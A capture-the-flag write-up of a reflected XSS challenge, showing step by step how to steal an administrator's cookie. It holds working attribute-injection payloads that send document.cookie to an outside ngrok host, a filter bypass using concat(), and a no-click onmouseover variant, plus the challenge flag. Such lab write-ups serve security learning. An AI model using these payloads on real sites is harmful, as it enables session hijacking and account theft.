# XSS - Reflected

**Point**: 45 Points

**Title**: alert(’xtra stupid security’);

**Description**: Find a way to steal the administrator’s cookie. Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.

## Solution:

Let's meet a "normal" website. Now poking around with this. We can notice that all the link we accessed controlled by the parameter `p` in URL. This may be a typical XSS Reflected, try to change to our value instead. For example, `?p=hackingtutorial`

<p align="center"><img width=500px height=300px src="https://user-images.githubusercontent.com/48288606/159111674-22d747f9-47b9-4018-a419-28fbd9aff9de.png" /></p>

Comes up a 404 error site. Now inspect where our input string is shown up.

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159111735-5a7f64bc-ebef-4b3c-90e3-e3b65bd4b6d1.png" /></p>

Check whether XSS is possible, escape with DOM-based and payload looks like this: `hacking' onclick='alert(1)`

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159111932-17dd56c1-983f-463b-ac4f-9d73dcb775ab.png" /></p>

Now this proves XSS can be in action. We have to delivery all collected cookie from victim (administrator) to a specific server that we take control. Payload will look like this:

```javascript
hacking' onclick='document.location="{your_server_link_site}?cookie=" + document.cookie;
```

Let's take action step-by-step:

1. Run PHP server with **localhost** and optional **port** without any content: `php -S localhost:4444 `

2. Public our server by tunneling. I use **ngrok** to serve this purpose:
   - Connect to ngrok with your account token: `ngrok authtoken {your_account_token}`
   - Tunneling our local site to public network with port specified above: `ngrok http 4444`
   - Get the public link we get from ngrok and create with payload above.
   <p align="center"><img src="https://user-images.githubusercontent.com/48288606/159112172-819bcfa6-65e2-410a-859f-2b0ead8a6e37.png" /></p>

3. Send our payload: `hacking` in **title** and 
```javascript
hacking' onclick='document.location="http://9e2d-113-161-77-200.ngrok.io?cookie=" + document.cookie;
``` 
When we click in the link, it doesn't direct to our server. Why?

<p align="center"><img width=500px height=300px  src="https://user-images.githubusercontent.com/48288606/159112318-8b72c5a6-9bb8-4c0a-9637-7af5962c15a6.png" /></p>

The plus symbol `+` has been filtered by the back-end server. We can bypass this by simply replace `+` with `concat()` function to combine 2 strings.

```javascript
hacking' onclick='document.location="http://9e2d-113-161-77-200.ngrok.io?cookie=".concat(document.cookie);
``` 
**NOTE: The payload above won't make the page direct to our site.** `onclick` **attribute will default open the link which is specified before** `hacking`. **So we have to ** `preventDefault()` at the end of our payload

```html
<a href="?p=hacking" onclick="document.location=&quot;http://9e2d-113-161-77-200.ngrok.io?cookie=&quot;.concat(document.cookie);">
  hacking' onclick='document.location="http://9e2d-113-161-77-200.ngrok.io?cookie=".concat(document.cookie);
</a>
```
Now we can click on the link to direct to our page.

Payload: 
```html
hacking' onclick='document.location="http://9e2d-113-161-77-200.ngrok.io?cookie=".concat(document.cookie);return false;`
```

We did it !

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159112967-a01d34f7-c21b-4f08-8579-5eecc2737c51.png" /></p>

Now we just send this link to administrator by click button "Report to the administrator"

Wait for the autobot to response for so long time! Maybe sth wrong ? Look back at the description, we forgot an important warning "Be careful, this administrator is aware of info security and he does not click on strange links that he could receive."

Now that's clear. It won't work because the admin won't click to that link. So we have to avoid event like `onclick`, take advantage of events for mouse like `onmousemove`, `onmouseout`, `onmouseover`, ... bla bla. (Fortunately, don't really mess with `preventDefault()` anymore

Final payload: 

```html
hacking' onmouseover='document.location="http://9e2d-113-161-77-200.ngrok.io?cookie=".concat(document.cookie);
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159113493-f9a8d188-fbb8-434d-a533-f2ef16c4755e.png" /> </p>

The cookie create by **administrator** shown up in the request.

FLag: **r3fL3ct3D_XsS_fTw**

